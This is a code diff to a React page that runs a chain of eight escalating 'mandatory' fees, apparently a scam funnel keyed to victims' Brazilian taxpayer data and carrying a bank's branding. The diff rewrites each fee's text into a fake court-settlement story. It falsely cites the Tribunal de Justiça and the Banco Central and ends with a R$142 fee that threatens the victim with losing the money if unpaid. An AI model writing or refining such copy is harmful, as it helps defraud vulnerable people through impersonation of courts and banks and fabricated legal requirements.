@@ -7,47 +7,47 @@ import { CPFData } from "@/lib/cpf";
 import { getSession, saveSession } from "@/hooks/useSessionPersistence";
 import { buildUrlWithUtm } from "@/hooks/useUtmTracking";
 
-// Define the 7 upsells with their values and descriptions
+// Define the 8 upsells with judicial context
 const UPSELLS = [
   {
     valor: 14.21,
-    title: "Taxa de Processamento Prioritário",
-    description: "Garanta processamento prioritário da sua indenização e receba antes dos demais beneficiários.",
+    title: "Taxa de Prioridade Judicial",
+    description: "Garante prioridade na fila de pagamentos do Tribunal, recebendo antes dos demais credores.",
   },
   {
     valor: 32.98,
-    title: "Seguro de Transferência Bancária",
-    description: "Proteja sua transferência contra falhas e garanta que o valor chegue com segurança total.",
+    title: "Seguro de Execução Judicial",
+    description: "Seguro obrigatório exigido pelo BACEN para proteger transferências judiciais acima de R$ 3.000.",
   },
   {
     valor: 21.30,
-    title: "Taxa de Validação Bancária",
-    description: "Validação obrigatória junto ao Banco Central para liberação de valores acima de R$ 5.000,00.",
+    title: "Taxa de Homologação do BACEN",
+    description: "Homologação do Banco Central para validar a origem legal dos valores liberados pelo Tribunal.",
   },
   {
     valor: 28.83,
-    title: "Certificado Digital de Autenticidade",
-    description: "Documento digital que comprova a autenticidade e legalidade da sua indenização.",
+    title: "Certidão de Autenticidade Judicial",
+    description: "Documento judicial que certifica a legalidade e procedência da sua ordem de pagamento.",
   },
   {
     valor: 13.23,
-    title: "Taxa de Liberação Imediata",
-    description: "Libere sua indenização imediatamente sem aguardar o prazo padrão de processamento.",
+    title: "Taxa de Urgência Processual",
+    description: "Acelera o processamento judicial para liberação em até 6 horas após pagamento.",
   },
   {
     valor: 11.00,
-    title: "Proteção Anti-Fraude Premium",
-    description: "Sistema avançado de proteção que garante a segurança total da sua transação.",
+    title: "Seguro de Fraude Processual",
+    description: "Proteção contra tentativas de fraude no processo de liquidação judicial.",
   },
   {
     valor: 8.83,
-    title: "Taxa de Finalização",
-    description: "Última etapa para conclusão do processo e liberação definitiva da sua indenização.",
+    title: "Taxa de Encerramento do Processo",
+    description: "Taxa para encerramento formal do processo no sistema do Tribunal de Justiça.",
   },
   {
     valor: 142.00,
-    title: "Taxa de Homologação Final",
-    description: "ATENÇÃO: Esta é a taxa obrigatória de homologação junto ao Banco Central. Sem o pagamento desta taxa, seu benefício será CANCELADO e você NÃO receberá nenhum valor. Esta é a última etapa para garantir o recebimento da sua indenização.",
+    title: "Taxa de Sentença Final do Tribunal",
+    description: "OBRIGATÓRIO: Última taxa judicial exigida para execução da sentença. Sem pagamento, o processo será arquivado e você PERDERÁ o direito aos valores.",
   },
 ];
 
@@ -111,7 +111,7 @@ const Upsell = () => {
     <div className="min-h-screen min-h-[100dvh] bg-background flex flex-col">
       <WillBankHeader 
         userName={cpfData.nome.split(' ')[0].toUpperCase()} 
-        breadcrumb={`Benefício > Indenização > Etapa ${stepNumber}/8`}
+        breadcrumb={`Liquidação Judicial > Taxas Obrigatórias > Etapa ${stepNumber}/8`}
       />
 
       <main className="flex-1 flex items-center justify-center p-3 sm:p-6">
